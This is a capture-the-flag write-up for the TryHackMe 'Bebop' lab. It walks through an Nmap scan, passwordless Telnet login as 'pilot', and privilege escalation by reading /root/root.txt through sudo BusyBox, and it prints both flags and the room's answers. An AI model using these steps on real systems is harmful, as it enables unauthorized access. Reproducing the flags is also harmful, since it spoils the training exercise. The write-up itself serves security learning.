

# Write-Up — [Bebop Room](https://tryhackme.com/room/bebop)

## 1. Initial Scan

We begin with a quick scan of the target using Nmap:

```bash
nmap MACHINE_IP
```

### Results:

* Port 22 → SSH
* Port 23 → Telnet

We are also given a codename: **pilot**



## 2. Initial Access

### SSH Attempt (Failed)

A brute-force attempt using Hydra against SSH was unsuccessful.



### Telnet Access

We then try connecting via Telnet:

```bash
telnet MACHINE_IP
```

Prompt:

```
login as: pilot
```

Entering **pilot** grants immediate access without requiring a password.

This provides a shell directly.



## 3. User Flag

List files:

```bash
ls
```

We find `user.txt` and display it:

```bash
cat user.txt
```

### User Flag:

```
THM{r3m0v3_b3f0r3_fl16h7}
```



## 4. Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

### Result:

The user can execute BusyBox with elevated privileges.



## 5. Exploitation

Using GTFOBins, we identify a method to read files as root.

Instead of spawning a root shell, we directly read the root flag:

```bash
sudo busybox cat /root/root.txt
```



## 6. Root Flag

```
THM{h16hw4y_70_7h3_d4n63r_z0n3}
```



## 7. Final Questions

* Low privileged user: `pilot`
* Binary used for privilege escalation: `busybox`
* Service used for initial access: `telnet`
* Operating System: `freebsd`



## 8. Conclusion

This room highlights several key points:

* Misconfigured Telnet services can allow unauthorized access without authentication
* The importance of checking sudo permissions with `sudo -l`
* The usefulness of GTFOBins for privilege escalation techniques

This is a straightforward but effective room to practice:

* Enumeration (Nmap)
* Initial access (Telnet)
* Privilege escalation (BusyBox)



